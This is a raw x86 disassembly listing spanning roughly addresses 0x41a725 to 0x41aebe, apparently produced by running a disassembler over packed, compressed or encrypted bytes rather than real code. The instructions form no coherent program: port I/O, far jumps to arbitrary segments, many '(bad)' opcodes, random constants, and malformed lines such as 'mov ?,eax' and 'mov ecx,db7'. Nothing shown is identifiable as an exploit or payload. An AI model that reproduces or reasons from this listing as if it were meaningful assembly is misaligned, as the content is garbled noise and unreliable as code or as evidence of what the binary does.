  41a725:	in     al,dx
  41a726:	scas   eax,DWORD PTR es:[edi]
  41a727:	repnz mov ah,0x98
  41a72a:	adc    ecx,ecx
  41a72c:	push   ebp
  41a72d:	add    DWORD PTR [ecx-0x1a],ebx
  41a730:	stos   DWORD PTR es:[edi],eax
  41a731:	sbb    esi,DWORD PTR [edi]
  41a733:	in     eax,0x93
  41a735:	fst    DWORD PTR [edi-0x3c]
  41a738:	inc    eax
  41a739:	neg    edi
  41a73b:	push   ecx
  41a73c:	pop    edi
  41a73d:	sahf   
  41a73e:	jmp    0x41a6c1
  41a740:	(bad)  
  41a741:	sbb    bh,dl
  41a743:	test   al,0x81
  41a745:	sahf   
  41a746:	fadd   DWORD PTR [edi+0x71]
  41a749:	xchg   edx,eax
  41a74a:	mov    esi,0xbefc05f4
  41a74f:	lahf   
  41a750:	test   ebx,edi
  41a752:	sub    eax,0x8c177b6d
  41a757:	xor    al,0xdc
  41a759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a75a:	shl    BYTE PTR [esi+0x6686aaa2],1
  41a760:	cs lahf 
  41a762:	mov    eax,0x74bb1144
  41a767:	and    al,0x97
  41a769:	mov    eax,0x4a1dd8db
  41a76e:	cld    
  41a76f:	stc    
  41a770:	das    
  41a771:	ret    
  41a772:	clc    
  41a773:	shl    BYTE PTR [ecx],1
  41a775:	fs mov ch,0x8a
  41a778:	xchg   DWORD PTR [ebp-0x46],ebx
  41a77b:	xor    al,0x1c
  41a77d:	add    ecx,DWORD PTR [ebx-0x545d729b]
  41a783:	add    DWORD PTR [ebx-0x23df0258],ecx
  41a789:	inc    eax
  41a78a:	in     al,0x40
  41a78c:	mov    edx,edi
  41a78e:	jle    0x41a727
  41a790:	arpl   sp,di
  41a792:	mov    eax,0x2e217464
  41a797:	bound  esp,QWORD PTR [esi+0x62]
  41a79a:	psllw  mm5,QWORD PTR [edi]
  41a79d:	inc    ecx
  41a79e:	add    ah,bl
  41a7a0:	neg    BYTE PTR [esi]
  41a7a2:	xchg   DWORD PTR [edi+0x69d3e6f4],ebx
  41a7a8:	test   DWORD PTR [ebx-0x1fdbcb49],0x51c59512
  41a7b2:	pop    ebx
  41a7b3:	jmp    0x8da5:0x526aa662
  41a7ba:	out    0x30,al
  41a7bc:	and    eax,0xf1f44491
  41a7c1:	or     DWORD PTR [edi+esi*2+0x45],esi
  41a7c5:	pop    ds
  41a7c6:	add    edx,ebp
  41a7c8:	(bad)  [edi]
  41a7ca:	fisubr WORD PTR [edx-0x77]
  41a7cd:	jmp    0x2e2f59c1
  41a7d2:	xor    DWORD PTR [edi+ebx*4+0x6aebeba],eax
  41a7d9:	test   ch,dl
  41a7db:	pusha  
  41a7dc:	xor    DWORD PTR [ecx-0xf524363],ebx
  41a7e2:	xchg   ax,ax
  41a7e4:	dec    ebx
  41a7e5:	cmc    
  41a7e6:	mov    dl,0xf4
  41a7e8:	scas   al,BYTE PTR es:[edi]
  41a7e9:	cs push cs
  41a7eb:	cmp    BYTE PTR [esi+0x2b37366b],al
  41a7f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7f2:	ret    
  41a7f3:	mov    DWORD PTR [edi],ecx
  41a7f5:	inc    ebp
  41a7f6:	aaa    
  41a7f7:	std    
  41a7f8:	jbe    0x41a866
  41a7fa:	mov    ah,0xb4
  41a7fc:	add    al,0x5b
  41a7fe:	sub    eax,0x97d195f2
  41a803:	in     eax,dx
  41a804:	and    eax,0x242538cb
  41a809:	leave  
  41a80a:	icebp  
  41a80b:	outs   dx,DWORD PTR ds:[esi]
  41a80c:	mov    ebp,0x61bb1bff
  41a811:	popf   
  41a812:	jmp    0x41a879
  41a814:	fwait
  41a815:	enter  0x8886,0x1a
  41a819:	add    DWORD PTR [esi+0x7b],ebp
  41a81c:	and    dh,BYTE PTR [eax-0x4b]
  41a81f:	aam    0xe0
  41a821:	loop   0x41a7b9
  41a823:	sbb    al,0x6d
  41a825:	mov    eax,ds:0x49049b7b
  41a82a:	lods   al,BYTE PTR ds:[esi]
  41a82b:	rcl    BYTE PTR [ebx+0x1bfb3eea],1
  41a831:	std    
  41a832:	mov    esp,0x6c2017b4
  41a837:	shl    BYTE PTR [edi-0x9fa28e6],0x49
  41a83e:	dec    ebx
  41a83f:	lds    eax,FWORD PTR [edx+0x45]
  41a842:	leave  
  41a843:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a844:	and    BYTE PTR [eax+0x58],0x84
  41a848:	sbb    ebp,DWORD PTR [ecx-0x78e32907]
  41a84e:	enter  0x3fd0,0xeb
  41a852:	fwait
  41a853:	int3   
  41a854:	repz jge 0x41a883
  41a857:	ins    DWORD PTR es:[edi],dx
  41a858:	pop    ebp
  41a859:	jnp    0x41a7ff
  41a85b:	in     eax,0x1a
  41a85d:	mov    ecx,0xbc00cdb1
  41a862:	xchg   BYTE PTR [esi+0x3b3ba61c],cl
  41a868:	std    
  41a869:	ins    BYTE PTR es:[edi],dx
  41a86a:	push   edi
  41a86b:	cmp    dl,BYTE PTR [edx]
  41a86d:	aad    0x6b
  41a86f:	push   ecx
  41a870:	test   al,0x13
  41a872:	mov    eax,0x2b07f6a4
  41a877:	jge    0x41a88e
  41a879:	push   es
  41a87a:	shl    ch,1
  41a87c:	nop
  41a87d:	jle    0x41a821
  41a87f:	aas    
  41a880:	pop    ss
  41a881:	imul   edi,ebx,0xa34fc543
  41a887:	fs js  0x41a82e
  41a88a:	retf   
  41a88b:	rcr    BYTE PTR [ecx-0x76],cl
  41a88e:	mov    ecx,0xf3f1bdfa
  41a893:	clc    
  41a894:	dec    bx
  41a896:	mov    esp,0xa6bfd0b4
  41a89b:	xchg   ebp,eax
  41a89c:	cmc    
  41a89d:	adc    eax,0x211feea7
  41a8a2:	(bad)  
  41a8a3:	push   ss
  41a8a4:	and    ebx,DWORD PTR [ecx]
  41a8a6:	(bad)  
  41a8a7:	div    DWORD PTR [ebx-0x66740176]
  41a8ad:	and    DWORD PTR [eax-0x7cb6dc8d],esp
  41a8b3:	cmp    DWORD PTR [edi],edi
  41a8b5:	les    edx,FWORD PTR [ecx-0x1a7fb3ac]
  41a8bb:	pop    eax
  41a8bc:	dec    esi
  41a8bd:	das    
  41a8be:	mov    ebx,0x99b071a4
  41a8c3:	jae    0x41a912
  41a8c5:	push   edx
  41a8c6:	mov    WORD PTR [eax],cs
  41a8c8:	mov    al,ds:0x6026b99c
  41a8cd:	fdivr  QWORD PTR [edx-0x5d26027c]
  41a8d3:	jecxz  0x41a93e
  41a8d5:	fwait
  41a8d6:	push   ebx
  41a8d7:	xchg   ebp,eax
  41a8d8:	mov    cl,0xb
  41a8da:	mov    esp,0xc96a3570
  41a8df:	cld    
  41a8e0:	cmp    esp,DWORD PTR [edi]
  41a8e2:	add    ebx,0xac5d41b4
  41a8e8:	es xor dl,bl
  41a8eb:	jecxz  0x41a87c
  41a8ed:	sub    BYTE PTR [ebx+0x19164805],dl
  41a8f3:	xor    bh,bl
  41a8f5:	or     bh,BYTE PTR [edx-0x61496a44]
  41a8fb:	out    dx,al
  41a8fc:	gs mov ebp,0x39223c19
  41a902:	stos   DWORD PTR es:[edi],eax
  41a903:	pop    ecx
  41a904:	icebp  
  41a905:	outs   dx,DWORD PTR ds:[esi]
  41a906:	mov    DWORD PTR [eax+0xc],eax
  41a909:	xor    al,0xd3
  41a90b:	retf   0x8515
  41a90e:	fwait
  41a90f:	out    dx,eax
  41a910:	sub    DWORD PTR [edx],edi
  41a912:	push   ecx
  41a913:	repnz and cl,cl
  41a916:	ds sahf 
  41a918:	mov    ?,eax
  41a91a:	cmp    BYTE PTR [edi-0x63],al
  41a91d:	lock mov ecx,DWORD PTR [ecx-0x4c]
  41a921:	dec    ebx
  41a922:	sbb    ch,BYTE PTR [edx+0xd]
  41a925:	push   0x5ccbe568
  41a92a:	shr    ah,cl
  41a92c:	aad    0x36
  41a92e:	js     0x41a918
  41a930:	rcr    DWORD PTR [edi],1
  41a932:	mov    dl,BYTE PTR [edx-0xd03bffb]
  41a938:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a939:	jmp    0x41a945
  41a93b:	lahf   
  41a93c:	push   ds
  41a93d:	pop    ecx
  41a93e:	dec    edi
  41a93f:	(bad)  
  41a940:	out    dx,al
  41a941:	iret   
  41a942:	and    DWORD PTR [esi-0x336161fe],0x1e
  41a949:	ss fdivr st(2),st
  41a94c:	(bad)  
  41a94d:	sbb    DWORD PTR [edi+ebp*8-0x42fe9e7e],esp
  41a954:	and    ebp,DWORD PTR [edx-0x4c]
  41a957:	pop    edi
  41a958:	aad    0xdc
  41a95a:	mov    edi,0x689737e7
  41a95f:	out    0x58,eax
  41a961:	push   0xd0b2dc1a
  41a966:	mov    al,0xb4
  41a968:	fs mov ah,0x29
  41a96b:	rol    BYTE PTR [edi+0x39],cl
  41a96e:	test   eax,0x868852d9
  41a973:	push   ss
  41a974:	sbb    BYTE PTR [ecx+0x71],ah
  41a977:	das    
  41a978:	jmp    0x201:0x1a618d0a
  41a97f:	dec    edx
  41a980:	add    dl,BYTE PTR [edx]
  41a982:	jl     0x41a9f9
  41a984:	test   DWORD PTR [eax+0x4118e71f],ecx
  41a98a:	ror    BYTE PTR [edi],cl
  41a98c:	and    eax,0x4751e229
  41a991:	cmp    DWORD PTR [ecx],0x3bd02670
  41a997:	xchg   esp,eax
  41a998:	dec    ebp
  41a999:	xchg   esp,eax
  41a99a:	icebp  
  41a99b:	cmp    bl,BYTE PTR [eax]
  41a99d:	idiv   BYTE PTR [esi+0x5f]
  41a9a0:	dec    esi
  41a9a1:	imul   esi,ecx,0x5a8be4b9
  41a9a7:	cmp    al,0x25
  41a9a9:	mov    ecx,0xa7badc78
  41a9ae:	fld    TBYTE PTR [eax+eiz*8-0x61]
  41a9b2:	iret   
  41a9b3:	iret   
  41a9b4:	test   DWORD PTR [ecx-0x323a19f3],0xc2242527
  41a9be:	xchg   ecx,eax
  41a9bf:	jno    0x41a964
  41a9c1:	xchg   esi,eax
  41a9c2:	lods   al,BYTE PTR ds:[esi]
  41a9c3:	mov    ch,BYTE PTR [edi+0x1c32aefe]
  41a9c9:	jmp    0x3461e312
  41a9ce:	adc    al,0x22
  41a9d0:	jecxz  0x41a972
  41a9d2:	mov    cl,0xc4
  41a9d4:	jns    0x41a9d4
  41a9d6:	and    ebx,DWORD PTR [eax-0x176e16cb]
  41a9dc:	inc    ebp
  41a9dd:	into   
  41a9de:	repz sbb dl,BYTE PTR [eax+0x39]
  41a9e2:	mov    ebp,0xf9e3a2dc
  41a9e7:	xchg   ah,ah
  41a9e9:	or     DWORD PTR [edx-0x154ba9b],edi
  41a9ef:	in     al,dx
  41a9f0:	sti    
  41a9f1:	sub    eax,0xf920ca0d
  41a9f6:	rol    BYTE PTR [esi-0x5e81078b],0xb7
  41a9fd:	fimul  DWORD PTR [edi+eiz*8+0x5e571d0b]
  41aa04:	fisubr WORD PTR [ecx-0x1a5ebb4f]
  41aa0a:	aam    0x53
  41aa0c:	fcomp  QWORD PTR [eax-0x2]
  41aa0f:	push   esi
  41aa10:	mov    al,ds:0x15a4b0b6
  41aa15:	mov    al,0xbb
  41aa17:	imul   edi,DWORD PTR [esi],0x7598fe36
  41aa1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa1e:	and    DWORD PTR ds:0xd8e29923,ecx
  41aa24:	data16 js 0x41aa47
  41aa27:	in     eax,0x17
  41aa29:	ficomp WORD PTR [eax-0x21f379a]
  41aa31:	int    0x23
  41aa33:	por    mm3,mm6
  41aa36:	leave  
  41aa37:	test   al,ch
  41aa39:	cld    
  41aa3a:	cmp    BYTE PTR [edx+0x523b9ca5],cl
  41aa40:	jbe    0x41aa01
  41aa42:	dec    edx
  41aa43:	and    bh,BYTE PTR [ecx-0x14]
  41aa46:	xlat   BYTE PTR ds:[ebx]
  41aa47:	retf   
  41aa48:	pop    edx
  41aa49:	out    0xb6,eax
  41aa4b:	adc    al,0xb1
  41aa4d:	cld    
  41aa4e:	(bad)  
  41aa4f:	int3   
  41aa50:	adc    eax,0x71e6526e
  41aa55:	add    DWORD PTR [eax],0xffffffb8
  41aa58:	sti    
  41aa59:	test   eax,0x996c9c95
  41aa5e:	aaa    
  41aa5f:	in     al,dx
  41aa60:	fisttp DWORD PTR [esp+edi*1]
  41aa63:	mov    ebx,0xeeaa1c65
  41aa68:	je     0x41aac5
  41aa6a:	lods   al,BYTE PTR ds:[esi]
  41aa6b:	mov    ecx,db7
  41aa6e:	fcom   QWORD PTR [edi+ebp*4]
  41aa71:	jmp    0x9a1b:0x9f451d7b
  41aa78:	jbe    0x41aa61
  41aa7a:	lds    ecx,FWORD PTR [ebp-0x43]
  41aa7d:	clc    
  41aa7e:	sub    al,0xca
  41aa80:	xchg   ecx,eax
  41aa81:	mov    ds:0x6fedc4bc,eax
  41aa86:	xchg   BYTE PTR [esi],al
  41aa88:	imul   BYTE PTR [eax]
  41aa8a:	imul   ebx,DWORD PTR [edi+0x0],0x96d73a9e
  41aa91:	fcmovu st,st(7)
  41aa93:	xor    eax,0xf4ba5460
  41aa98:	pop    ebp
  41aa99:	fwait
  41aa9a:	pop    ds
  41aa9b:	fcmovb st,st(5)
  41aa9d:	add    ch,dh
  41aa9f:	hlt    
  41aaa0:	dec    edx
  41aaa2:	mov    BYTE PTR [ebp-0x2c],ch
  41aaa5:	(bad)  
  41aaa6:	stos   DWORD PTR es:[edi],eax
  41aaa7:	call   0xa5087e70
  41aaac:	inc    ebp
  41aaad:	xchg   ebp,eax
  41aaae:	or     BYTE PTR [eax],cl
  41aab0:	ffreep st(5)
  41aab2:	ret    
  41aab3:	call   0xc4d5:0xf19de295
  41aaba:	iret   
  41aabb:	inc    ecx
  41aabc:	push   ss
  41aabd:	imul   esp,ecx,0x9ccf8168
  41aac3:	arpl   WORD PTR [ecx-0x47],dx
  41aac6:	mov    DWORD PTR [edi-0x43],esp
  41aac9:	jg     0x41ab28
  41aacb:	aam    0x5a
  41aacd:	jnp    0x41aad7
  41aacf:	add    DWORD PTR [edi],edx
  41aad1:	or     eax,0x6f88ad2b
  41aad6:	pop    eax
  41aad7:	jecxz  0x41aadc
  41aad9:	mov    cl,0xb4
  41aadb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aadc:	push   ss
  41aadd:	push   ss
  41aade:	stc    
  41aadf:	push   0x9
  41aae1:	mov    ebp,0xd9dba749
  41aae6:	mov    ebx,0x9f5e52a4
  41aaeb:	movaps XMMWORD PTR [ebp+0x601d94bb],xmm5
  41aaf2:	mov    es,ecx
  41aaf4:	xor    eax,0x84f89d76
  41aaf9:	or     esi,edi
  41aafb:	push   ebx
  41aafc:	and    eax,0x9501ca9e
  41ab01:	sbb    DWORD PTR [esi],esi
  41ab03:	pop    eax
  41ab04:	fnstenv [eax-0x62cb75be]
  41ab0a:	es pop es
  41ab0c:	sbb    dl,BYTE PTR [eax-0x81853bd]
  41ab12:	push   esi
  41ab13:	iret   
  41ab14:	jns    0x41ab2f
  41ab16:	ds icebp 
  41ab18:	inc    ebx
  41ab19:	cs mov ch,0x53
  41ab1c:	shl    DWORD PTR ss:0x66191d05,1
  41ab23:	mov    eax,0x42ba1ff
  41ab28:	addr16 mov al,ds:0x3111
  41ab2c:	xchg   ebx,eax
  41ab2d:	mov    cl,0x96
  41ab2f:	ins    BYTE PTR es:[edi],dx
  41ab30:	dec    ebx
  41ab31:	lods   al,BYTE PTR ds:[esi]
  41ab32:	mov    ebp,0x20afb6f4
  41ab37:	scas   eax,DWORD PTR es:[edi]
  41ab38:	out    0x64,al
  41ab3a:	call   FWORD PTR [ecx]
  41ab3c:	aas    
  41ab3d:	in     eax,dx
  41ab3e:	pop    ds
  41ab3f:	pop    ecx
  41ab40:	adc    BYTE PTR [edi-0x625bfc4a],0xa0
  41ab47:	and    eax,0xe5627a51
  41ab4c:	ja     0x41ab19
  41ab4e:	retf   
  41ab4f:	mov    eax,ss:0xb6a49d77
  41ab55:	arpl   WORD PTR [ebp+0x23],bx
  41ab58:	cli    
  41ab59:	add    DWORD PTR [ebp-0x4859c886],edi
  41ab5f:	adc    al,0xc8
  41ab61:	out    0x3b,al
  41ab63:	adc    al,0x65
  41ab65:	and    eax,0x3f90f1f2
  41ab6a:	adc    eax,0x8b5c0144
  41ab6f:	cmp    bl,BYTE PTR [eax]
  41ab71:	jns    0x41ab8a
  41ab73:	dec    ah
  41ab75:	shl    DWORD PTR [ecx],1
  41ab77:	stos   BYTE PTR es:[edi],al
  41ab78:	and    eax,0x49f3901e
  41ab7d:	or     eax,DWORD PTR [edx-0x2b]
  41ab80:	xchg   BYTE PTR [ecx-0x29ece344],bh
  41ab86:	jbe    0x41abbb
  41ab88:	sub    ah,al
  41ab8a:	mov    al,0x7a
  41ab8c:	js     0x41abf3
  41ab8e:	sub    esi,DWORD PTR [eax-0x6b]
  41ab91:	test   al,0x60
  41ab93:	repz call 0x15c9:0x1914a39d
  41ab9b:	mov    eax,0xbe6a0140
  41aba0:	xchg   esi,eax
  41aba1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aba2:	pop    ebx
  41aba3:	icebp  
  41aba4:	push   ebx
  41aba5:	retf   0x9940
  41aba8:	push   0xffffff81
  41abaa:	imul   esp,DWORD PTR [ebp+0x63b880f8],0x84bb9361
  41abb4:	pop    ds
  41abb5:	shl    edx,1
  41abb7:	bound  edx,QWORD PTR [ebp+0x4f]
  41abba:	loope  0x41abc1
  41abbc:	jg     0x41ab78
  41abbe:	test   ebx,esi
  41abc0:	fcomp  QWORD PTR [edi-0x4a]
  41abc3:	and    al,0x5c
  41abc5:	into   
  41abc6:	mov    ebx,0x7f92f6ca
  41abcb:	into   
  41abcc:	sbb    edi,esi
  41abce:	mov    esp,DWORD PTR [edx]
  41abd0:	rep fs stos DWORD PTR es:[edi],eax
  41abd3:	or     al,0xe5
  41abd5:	call   0x91f9:0x95ccb4c6
  41abdc:	pop    esi
  41abdd:	clc    
  41abde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abdf:	repnz (bad) 
  41abe1:	cmp    eax,0x3f16d97b
  41abe6:	add    DWORD PTR [esi-0x12],ebp
  41abe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abea:	fsubr  QWORD PTR [edx-0xb488f25]
  41abf0:	push   0xffffffb4
  41abf2:	sub    BYTE PTR ds:0xd1428786,dh
  41abf8:	pop    ds
  41abf9:	and    edx,edi
  41abfb:	adc    BYTE PTR [eax],dl
  41abfd:	xor    edx,DWORD PTR [eax-0x10]
  41ac00:	dec    ebp
  41ac01:	fld    TBYTE PTR [ebp-0x572ae83b]
  41ac07:	int    0xd4
  41ac09:	pop    esp
  41ac0a:	ret    0xbd0e
  41ac0d:	pushf  
  41ac0e:	sub    edx,DWORD PTR [edx-0x2d8892af]
  41ac14:	shl    BYTE PTR [ebp-0x13],cl
  41ac17:	aam    0xa6
  41ac19:	repz mov ch,0xc4
  41ac1c:	dec    esi
  41ac1d:	mov    bl,0x45
  41ac1f:	mov    ds:0xf24cb845,eax
  41ac24:	mov    ah,0x7c
  41ac26:	push   cs
  41ac27:	sub    esi,DWORD PTR [ecx+ebx*2]
  41ac2a:	lock xchg esi,eax
  41ac2c:	sahf   
  41ac2d:	ds int 0x6c
  41ac30:	push   ds
  41ac31:	stos   DWORD PTR es:[edi],eax
  41ac32:	or     DWORD PTR [ebp+eiz*4+0x36ecbb83],eax
  41ac39:	and    BYTE PTR [eax+0x50898b33],ch
  41ac3f:	aad    0x49
  41ac41:	push   ss
  41ac42:	ins    BYTE PTR es:[edi],dx
  41ac43:	jecxz  0x41ac7e
  41ac45:	cld    
  41ac46:	mov    esp,0x3d49664c
  41ac4b:	retf   
  41ac4c:	push   ss
  41ac4d:	dec    ebx
  41ac4e:	lods   al,BYTE PTR fs:[esi]
  41ac50:	(bad)  
  41ac51:	adc    BYTE PTR [esi-0x3f387b33],cl
  41ac57:	les    ebp,FWORD PTR [ecx+0x5c4d3255]
  41ac5d:	in     eax,0x5
  41ac5f:	shl    DWORD PTR [ebp+0x28],1
  41ac62:	cmc    
  41ac63:	in     eax,0x96
  41ac65:	(bad)  
  41ac66:	aad    0x8
  41ac68:	lock cmp ch,BYTE PTR [ecx]
  41ac6b:	js     0x41ac8d
  41ac6d:	cdq    
  41ac6e:	add    DWORD PTR [eax+0x6c],esi
  41ac71:	or     bl,BYTE PTR ds:0x3dd275ba
  41ac77:	icebp  
  41ac78:	mov    DWORD PTR [ecx],ebx
  41ac7a:	test   eax,0x66794d74
  41ac7f:	pop    ebp
  41ac80:	push   0x52
  41ac82:	dec    ecx
  41ac83:	bound  esp,QWORD PTR [eax-0x55]
  41ac86:	das    
  41ac87:	push   0xcaa6c9b6
  41ac8c:	adc    al,0x6
  41ac8e:	push   cs
  41ac8f:	xchg   ecx,eax
  41ac90:	and    ebx,ecx
  41ac92:	xchg   edi,eax
  41ac93:	jno    0x41ac7a
  41ac95:	xchg   esi,eax
  41ac96:	aad    0x58
  41ac98:	sahf   
  41ac99:	or     dh,BYTE PTR [esi+0x633f56b4]
  41ac9f:	frstor [ebp+0x6cf5eb3c]
  41aca5:	dec    edx
  41aca6:	(bad)  
  41aca7:	fsub   QWORD PTR ds:0xfc986499
  41acad:	shl    bl,1
  41acaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acb0:	mov    al,0x9c
  41acb2:	xor    BYTE PTR [edi],cl
  41acb4:	je     0x41ac56
  41acb6:	mov    ebx,0x89454a9f
  41acbb:	clc    
  41acbc:	push   ds
  41acbd:	or     eax,0xefe856b2
  41acc2:	mov    bl,0x4
  41acc4:	xchg   esi,eax
  41acc5:	arpl   WORD PTR [eax-0x33],si
  41acc8:	mov    ch,0xb5
  41acca:	aam    0xe9
  41accc:	sti    
  41accd:	xchg   ebx,eax
  41acce:	mov    bl,0x89
  41acd0:	cmc    
  41acd1:	pop    edx
  41acd2:	adc    WORD PTR [esi],0xff81
  41acd6:	xor    DWORD PTR [edx+edx*2+0x5583b054],esi
  41acdd:	int    0x71
  41acdf:	out    0x61,eax
  41ace1:	adc    eax,0xd919d161
  41ace6:	adc    DWORD PTR [esi-0x570db81],0x32
  41aced:	sahf   
  41acee:	sub    ebp,esi
  41acf0:	xchg   edx,eax
  41acf1:	ins    BYTE PTR es:[edi],dx
  41acf2:	aad    0x8d
  41acf4:	adc    ecx,DWORD PTR [ecx]
  41acf6:	or     BYTE PTR [esi+edi*4+0x26],0xe7
  41acfb:	in     al,0xf7
  41acfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad00:	je     0x41acaa
  41ad02:	sub    edx,DWORD PTR [edi]
  41ad04:	fsubr  QWORD PTR [edi+ebx*8+0x49]
  41ad08:	loop   0x41acb1
  41ad0a:	add    al,BYTE PTR [ecx-0x3b45f555]
  41ad10:	push   edx
  41ad11:	push   ebp
  41ad12:	lahf   
  41ad13:	cdq    
  41ad14:	add    eax,0xa8f0a03f
  41ad19:	arpl   WORD PTR [esi+0x7c],si
  41ad1c:	push   edx
  41ad1d:	jmp    0xa84f939
  41ad22:	dec    bp
  41ad24:	scas   al,BYTE PTR es:[edi]
  41ad25:	imul   edi,edx,0x115025e7
  41ad2b:	out    dx,eax
  41ad2c:	inc    ebp
  41ad2d:	jns    0x41ada3
  41ad2f:	dec    esp
  41ad30:	sbb    al,0x29
  41ad32:	or     edx,DWORD PTR [eax+0x39]
  41ad35:	push   edx
  41ad36:	xchg   edi,eax
  41ad37:	pop    esp
  41ad38:	fild   QWORD PTR [eax+0x5729cd4b]
  41ad3e:	sub    al,0x53
  41ad40:	or     DWORD PTR [eax+edx*4],ebp
  41ad43:	loop   0x41acd9
  41ad45:	pop    esi
  41ad46:	mov    bh,0x44
  41ad48:	inc    esp
  41ad49:	sub    esp,0xb7cf6533
  41ad4f:	out    0x2b,eax
  41ad51:	sub    ebx,DWORD PTR [ecx+0x1f]
  41ad54:	push   ss
  41ad55:	sbb    DWORD PTR [esp+edi*2-0x25f5e98f],eax
  41ad5c:	mov    ds,WORD PTR [ecx+0x6f]
  41ad5f:	loopne 0x41ad5e
  41ad61:	mov    cl,0xb
  41ad63:	pop    ebx
  41ad64:	and    edi,ebx
  41ad66:	rcl    BYTE PTR [ebx+0x56],0xf4
  41ad6a:	dec    edi
  41ad6b:	stos   DWORD PTR es:[edi],eax
  41ad6c:	adc    DWORD PTR [ebx],eax
  41ad6e:	and    al,0x85
  41ad70:	sbb    al,0x31
  41ad72:	in     al,dx
  41ad73:	hlt    
  41ad74:	cld    
  41ad75:	fwait
  41ad76:	mov    ebx,0x50a90941
  41ad7b:	add    dl,BYTE PTR [edx]
  41ad7d:	jbe    0x41ad44
  41ad7f:	mov    BYTE PTR [edi-0x71],dl
  41ad82:	mov    ch,0x4
  41ad84:	jg     0x41adb3
  41ad86:	xor    eax,0xfb21bd24
  41ad8b:	push   0xe7de7ef5
  41ad90:	fist   DWORD PTR [eax+0x929eee1]
  41ad96:	sub    eax,DWORD PTR [ebp-0x25256c63]
  41ad9c:	sbb    BYTE PTR [edi+0xd],al
  41ad9f:	jmp    0x1d97:0x167680b6
  41ada6:	fs jno 0x41ae05
  41ada9:	lods   al,BYTE PTR ds:[esi]
  41adaa:	mov    bh,0xf0
  41adac:	and    ecx,DWORD PTR [ecx+0x1e62a3d6]
  41adb2:	addr16 test al,0xbd
  41adb5:	mov    al,ds:0xa4f4690b
  41adba:	ror    DWORD PTR [ecx],cl
  41adbc:	(bad)  
  41adbd:	aad    0xbf
  41adbf:	dec    eax
  41adc0:	jp     0x41aded
  41adc2:	mov    dl,0xf4
  41adc4:	jne    0x41ad67
  41adc6:	(bad)
  41adc9:	jl     0x41ade8
  41adcb:	jmp    0x9920:0xf0e2dbfc
  41add2:	pop    edx
  41add3:	hlt    
  41add4:	adc    ebp,DWORD PTR [ebx-0x3a]
  41add7:	mov    cl,0x10
  41add9:	and    al,0xc5
  41addb:	mov    al,ds:0x311bc645
  41ade0:	test   DWORD PTR [esi],edx
  41ade2:	xchg   edi,eax
  41ade3:	dec    ecx
  41ade4:	push   ebp
  41ade5:	test   DWORD PTR ds:0x2593cec2,ecx
  41adeb:	out    dx,al
  41adec:	pop    ds
  41aded:	stc    
  41adee:	ja     0x41ad99
  41adf0:	xchg   ebx,eax
  41adf1:	xchg   ebx,eax
  41adf2:	pop    esp
  41adf3:	sbb    ch,BYTE PTR ds:0x17632cd4
  41adf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adfa:	sti    
  41adfb:	mov    ds:0xb52b903c,al
  41ae00:	pop    ds
  41ae01:	mov    ecx,0xb79e8e8b
  41ae06:	mov    esi,0xcb9e194a
  41ae0b:	aad    0xdb
  41ae0d:	xlat   BYTE PTR ds:[ebx]
  41ae0e:	leave  
  41ae0f:	(bad)  
  41ae10:	gs sbb eax,0x4809014b
  41ae16:	mov    ah,0x44
  41ae18:	aam    0xa3
  41ae1a:	test   DWORD PTR ds:0xef421c25,0x2be4dde6
  41ae24:	or     bh,BYTE PTR [edx-0x64e48170]
  41ae2a:	lea    edi,[edx-0x79]
  41ae2d:	xchg   edi,eax
  41ae2e:	(bad)  
  41ae2f:	sub    DWORD PTR [ebp+0x63ec89d7],edx
  41ae35:	cwde   
  41ae36:	fnstsw WORD PTR ds:0x7b2a891f
  41ae3c:	add    BYTE PTR [esi-0x5703bd40],0x8b
  41ae43:	dec    ecx
  41ae44:	xchg   ebx,eax
  41ae45:	or     esi,DWORD PTR [ebx+0x3ea3ec68]
  41ae4b:	push   0x9
  41ae4d:	or     bh,BYTE PTR [ecx]
  41ae4f:	jo     0x41ae75
  41ae51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae52:	shl    DWORD PTR [esi-0x5520d241],1
  41ae58:	(bad)  
  41ae59:	or     eax,0xeee62336
  41ae5e:	mov    ecx,DWORD PTR [eax]
  41ae60:	test   edi,ebx
  41ae62:	xor    eax,0x4dfed4fe
  41ae67:	dec    eax
  41ae68:	sbb    al,0x79
  41ae6a:	pop    esp
  41ae6b:	lods   al,BYTE PTR ds:[esi]
  41ae6c:	(bad)  
  41ae6d:	cmp    bh,dl
  41ae6f:	rol    DWORD PTR ds:0x3be6f996,0x32
  41ae76:	rcr    BYTE PTR [eax+0x1d],1
  41ae79:	imul   ecx,ebp,0x4a7f8eb9
  41ae7f:	dec    ebx
  41ae80:	mov    ah,BYTE PTR [esi]
  41ae82:	xor    DWORD PTR ds:0x9fc3591c,edi
  41ae88:	in     al,dx
  41ae89:	adc    eax,0x29248654
  41ae8e:	ins    BYTE PTR es:[edi],dx
  41ae8f:	jecxz  0x41ae3b
  41ae91:	inc    edx
  41ae92:	outs   dx,DWORD PTR ds:[esi]
  41ae93:	imul   eax,DWORD PTR [ebx-0x6095645d],0x6b
  41ae9a:	repz aas 
  41ae9c:	ins    BYTE PTR es:[edi],dx
  41ae9d:	das    
  41ae9e:	enter  0x10cc,0x5f
  41aea2:	das    
  41aea3:	lds    ebp,FWORD PTR [esp+ebx*4]
  41aea6:	and    edi,ebp
  41aea8:	sbb    cl,BYTE PTR [eax+0x78]
  41aeab:	icebp  
  41aeac:	in     eax,0x1d
  41aeae:	mov    ebx,0x4940f2f3
  41aeb3:	jmp    0x41aed1
  41aeb5:	cmp    ebp,edx
  41aeb7:	xor    ebx,DWORD PTR [edx+0x859e487]
  41aebd:	sahf   
  41aebe:	mov    ebx,0x88869fdb
